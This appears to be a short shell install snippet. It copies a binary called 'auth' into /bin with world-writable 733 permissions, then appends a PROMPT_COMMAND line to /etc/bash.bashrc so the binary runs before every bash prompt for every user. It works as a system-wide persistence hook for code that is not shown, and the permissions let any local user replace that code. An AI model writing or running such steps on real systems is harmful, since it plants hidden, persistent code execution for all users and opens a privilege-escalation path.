cat auth > /bin/auth
chmod 733 /bin/auth

echo "export PROMPT_COMMAND='/bin/auth'" >> /etc/bash.bashrc

